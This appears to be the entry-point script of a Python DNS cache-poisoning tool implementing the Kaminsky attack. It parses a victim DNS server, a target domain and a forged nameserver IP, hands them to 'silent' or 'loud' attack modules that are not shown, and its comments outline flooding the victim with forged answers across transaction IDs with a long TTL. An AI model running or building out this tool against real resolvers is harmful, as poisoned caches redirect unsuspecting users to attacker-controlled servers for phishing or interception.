from scapy.all import *
import argparse
import sys
import validators
from kaminskySilent import silent as silent
from kaminskyLoud import loud as loud

# collect command line input
parser = argparse.ArgumentParser(description='Kaminsky DNS', prog='kaminsky')
parser.add_argument('victim', nargs='?', help='Victim DNS server (provide IP)', metavar='victimIP')
parser.add_argument('targetDomain', nargs='?', help='Target domain that is to be poisoned in the cache (provide URL)', metavar='targetURL')
parser.add_argument('addressToForge', nargs='?', help='Server to be spoofed as target domain\'s authoritate DNS server (provide IP)', metavar='yourDNSIP')
parser.add_argument('-s', '--silent', dest='silent', action='store_true', default='False')
parser.add_argument('-l', '--loud', dest='silent', action='store_false')

args = parser.parse_args()

# validate the input
if not validators.ipv4(args.victim):
    print 'Victim is not a valid IP address\nTerminating...'
    sys.exit()

if not validators.domain(args.targetDomain): #supports IDN
    print 'Target is not a valid domain\nTerminating...'
    sys.exit()

if not validators.ipv4(args.addressToForge):
    print 'Spoofing IP is not a valid IP address\nTerminating...'
    sys.exit()

# print the starting message and start
out = 'Victim DNS: ' + args.victim + '\nTarget domain: ' + args.targetDomain + '\nSpoofing IP: ' + args.addressToForge + '\nMethod: '
if args.silent:
    print (out + 'silent')
else:
    print (out + 'loud')
print '\nStarting sequence'

if args.silent:
    silent(args)
else:
    loud(args)

# check whether the supplied DNS server is authoritative and whether it supports reccursion
# if not print and terminate

# send the query with the taret domain to the victim

# after this the victim will start asking other DNS servers for the IP
# flood the victim with the forged query answers including the addressToForge
# try as many TXID combinations and set TTL to a very high value

# default DNS query packet
# pkt = IP(dst=victim) / UDP(dport=53) / DNS() # default port for DNS UDP queries
